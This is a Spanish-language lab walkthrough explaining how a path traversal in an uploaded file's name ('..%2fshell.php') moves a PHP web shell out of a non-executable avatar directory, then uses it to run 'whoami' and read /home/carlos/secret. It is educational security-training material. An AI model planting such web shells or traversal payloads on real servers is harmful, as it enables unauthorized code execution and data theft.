# 📤 Web shell upload mediante path traversal

## 📄 Descripción del laboratorio

El laboratorio incluye una funcionalidad de **subida de avatares** que permite subir archivos PHP, pero los almacena en un directorio donde la ejecución de PHP está deshabilitada.

Esta protección puede eludirse combinándola con una vulnerabilidad de **path traversal en el nombre del archivo**.

El objetivo es:

* Subir una **web shell PHP fuera del directorio restringido**.
* Ejecutarla para leer el archivo:

```
/home/carlos/secret
```

* Enviar el secreto para completar el laboratorio.

Credenciales de prueba:

```
wiener:peter
```



## 📚 Teoría

Una mitigación común contra **web shells** consiste en:

* Permitir la subida de archivos PHP.
* Almacenarlos en un **directorio no ejecutable**.

Por ejemplo, mediante configuraciones como:

```
php_flag engine off
```

Este enfoque es efectivo solo si el atacante **no puede controlar la ruta final del archivo**.

### 📌 El problema

Si la aplicación:

* Utiliza el **nombre de archivo proporcionado por el usuario**.
* No sanitiza correctamente secuencias como `../`.
* No normaliza ni valida la **ruta final de almacenamiento**.

entonces es posible **forzar que el archivo se escriba fuera del directorio seguro**, en una ubicación donde PHP sí se ejecuta.



## 📝 Práctica

### 🎯 Objetivo

Leer el archivo:

```
/home/carlos/secret
```



### 1️⃣  Iniciar sesión

Se accede a la aplicación con:

```
wiener:peter
```

Dentro del panel **My Account** se localiza la funcionalidad **Upload avatar**.



### 2️⃣ Subir una web shell básica

Se crea un archivo llamado `shell.php` con el siguiente contenido:

```php
<?php
  system($_GET['cmd']);
?>
```

Se intenta subir el archivo como avatar sin modificar la petición.



### 3️⃣ Confirmar la protección

Se accede a la URL del archivo subido, por ejemplo:

```
/files/avatars/shell.php
```

<img width="737" height="132" alt="image" src="https://github.com/user-attachments/assets/63d95b5d-6718-4772-947e-efc9d0f3be99" />
<br>

Resultado:

El código PHP **no se ejecuta**, sino que se muestra como texto plano.

Esto confirma que:

* `/files/avatars/` es un **directorio no ejecutable**.
* La mitigación está activa.



### 4️⃣ Interceptar la subida con Burp

Se intercepta la petición de subida utilizando **Burp Suite** y se envía al **Repeater**.

Se localiza el parámetro que indica el nombre del archivo, por ejemplo:

```
filename=shell.php
```



### 5️⃣ Inyectar path traversal

Se modifica el nombre del archivo para incluir una secuencia de traversal:

```
../shell.php
```

Para evitar que el servidor lo detecte o lo normalice antes de procesarlo, se codifica la barra:

```
..%2fshell.php
```



### 6️⃣ Reenviar la petición

Se envía la petición modificada.

<img width="1052" height="485" alt="image" src="https://github.com/user-attachments/assets/9e785e4c-823b-4526-9248-3114db73aacd" />
<br>

Resultado:

* El archivo se sube correctamente.
* El archivo se guarda en una **ruta distinta**.

Ruta efectiva final:

```
/files/shell.php
```



### 7️⃣ Ejecutar la web shell

Se accede a la siguiente URL:

```
/files/shell.php?cmd=whoami
```

<img width="794" height="100" alt="image" src="https://github.com/user-attachments/assets/b4bd5680-df9a-45b3-b44f-716a7cd30c17" />
<br>

Respuesta del servidor:

```
carlos
```

Esto confirma que existe **ejecución remota de código en el servidor**.



### 8️⃣ Leer el secreto

Se ejecuta el siguiente comando:

```
/files/shell.php?cmd=cat /home/carlos/secret
```

El servidor devuelve el contenido del archivo.

<img width="902" height="95" alt="image" src="https://github.com/user-attachments/assets/893ad7ea-ccaa-4868-bd30-d13bcb677267" />



### 9️⃣ Resolver el laboratorio

Se copia el valor obtenido y se introduce en el formulario de resolución del laboratorio.

El laboratorio se completa correctamente.
